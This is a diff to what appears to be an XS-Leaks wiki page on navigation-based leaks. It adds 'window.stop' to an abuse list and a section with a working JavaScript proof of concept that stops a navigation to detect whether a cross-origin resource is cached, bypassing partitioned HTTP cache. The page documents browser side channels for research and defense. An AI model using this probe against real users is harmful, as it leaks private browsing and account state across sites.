@@ -11,6 +11,7 @@ abuse = [
     "CSP Violations",
     "Redirects",
     "window.open",
+    "window.stop",
     "iframes",
 ]
 defenses = [
@@ -155,6 +156,38 @@ fetch('https://example.org/might_redirect', {
 
 An online bank decides to redirect wealthy users to attractive stock opportunities by triggering a navigation to a reserved space on the website when these users consult their account balance. If this is only done for a specific group of users, it becomes possible for an attacker to leak the "client status" of the user.
 
+## Partitioned HTTP Cache Bypass
+A window can prevent a navigation with window.stop()
+This can be used to detect if a resource is cached by checking if window.location results in an error.
+When the target resource is on the same origin as the target website this will bypass partitioned cache.
+```javascript
+async function ifCached_window(url) {
+  return new Promise(resolve => {
+    checker.location = url;
+
+    // Cache only
+    setTimeout(() => {
+      checker.stop();
+    }, 20);
+
+    // Get result
+    setTimeout(() => {
+      try {
+        if (checker.location.href !== "about:blank") {
+          // Origin has changed
+          resolve(true);
+          checker.location = "about:blank";
+        }
+      } catch {
+        // No permission for origin
+        resolve(true);
+        checker.location = "about:blank";
+      }
+      resolve(false);
+    }, 50);
+  });
+}
+```
 
 ## Defense
 
